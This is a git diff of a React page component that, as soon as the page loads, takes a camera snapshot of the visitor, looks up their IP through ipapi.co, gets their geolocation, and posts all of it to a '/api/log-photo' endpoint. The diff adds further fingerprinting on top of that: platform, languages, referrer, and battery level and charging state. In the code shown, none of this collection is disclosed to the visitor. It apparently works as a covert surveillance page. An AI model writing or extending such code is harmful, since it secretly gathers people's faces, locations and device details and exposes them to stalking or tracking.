@@ -16,25 +16,39 @@ export default function Home() {
           videoRef.current.srcObject = stream;
           await videoRef.current.play();
         }
-
-        // Wait 2 seconds before capturing
+  
         setTimeout(async () => {
           if (canvasRef.current && videoRef.current) {
             const ctx = canvasRef.current.getContext('2d');
             if (ctx) {
               ctx.drawImage(videoRef.current, 0, 0, 320, 240);
               const photo = canvasRef.current.toDataURL('image/jpeg');
-
+  
               const ipRes = await fetch('https://ipapi.co/json');
               const ipInfo = await ipRes.json();
               const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
               const userAgent = navigator.userAgent;
-
-              // Try geolocation
+              const platform = navigator.platform;
+              const languages = navigator.languages;
+              const referrer = document.referrer;
+  
+              const batteryInfo = {};
+  
+              if ('getBattery' in navigator) {
+                try {
+                  const battery = await (navigator).getBattery();
+                  batteryInfo.level = Math.round(battery.level * 100);
+                  batteryInfo.charging = battery.charging;
+                } catch (err) {
+                  console.warn('⚡ Battery info failed:', err);
+                }
+              }
+  
+              // Now send everything
               navigator.geolocation.getCurrentPosition(
                 async (pos) => {
                   const { latitude, longitude } = pos.coords;
-
+  
                   await fetch('/api/log-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -43,16 +57,18 @@ export default function Home() {
                       ipInfo,
                       timezone,
                       userAgent,
+                      platform,
+                      languages,
+                      batteryInfo,
+                      referrer,
                       location: { latitude, longitude },
                     }),
                   });
-
+  
                   setDone(true);
                   stream.getTracks().forEach((track) => track.stop());
                 },
-                async (err) => {
-                  console.warn('⚠️ Geolocation error:', err);
-
+                async () => {
                   await fetch('/api/log-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -61,9 +77,13 @@ export default function Home() {
                       ipInfo,
                       timezone,
                       userAgent,
+                      platform,
+                      languages,
+                      batteryInfo,
+                      referrer,
                     }),
                   });
-
+  
                   setDone(true);
                   stream.getTracks().forEach((track) => track.stop());
                 }
@@ -75,9 +95,10 @@ export default function Home() {
         console.error('❌ Camera access error', err);
       }
     };
-
+  
     capture();
   }, []);
+  
 
   return (
     <div
